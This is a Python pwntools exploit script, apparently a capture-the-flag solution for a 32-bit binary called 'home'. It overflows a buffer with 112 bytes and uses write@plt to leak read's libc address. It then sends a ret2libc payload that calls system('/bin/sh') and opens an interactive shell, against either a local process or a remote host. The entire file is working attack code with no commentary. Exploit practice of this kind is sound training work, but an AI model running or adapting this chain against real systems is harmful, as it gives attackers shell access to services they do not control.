#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 1
arch_64 = 0
exe = "./home"

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

context.terminal = ["tmux","splitw","-h"]
e = ELF(exe)
if debug:
    context.log_level = "debug"

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
    libc = ELF("./libc.so.6")
else:
    p = process([exe])
    if arch_64:
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        arena = 0x3c4b20
        context.arch = "amd64"
    else:
        libc = ELF("/lib/i386-linux-gnu/libc.so.6")
        arena = 0x1b2780
        context.arch = "i386"

def z():
    gdb.attach(p)
write_plt = e.plt['write']
vul = e.symbols['vul']
read_got = e.got['read']

p.recv(10)
# wirte_plt(1,read_got,4)
p1 = "A"*112+flat([write_plt,vul,1,read_got,4])
p.sendline(p1)

read_addr = u32(p.recv(4))
libc.address = read_addr - libc.symbols["read"]
system = libc.symbols["system"]
bin_sh = libc.search("/bin/sh").next()

p2 = "A"*112+flat([system,"BBBB",bin_sh])
sl(p2)

p.interactive()


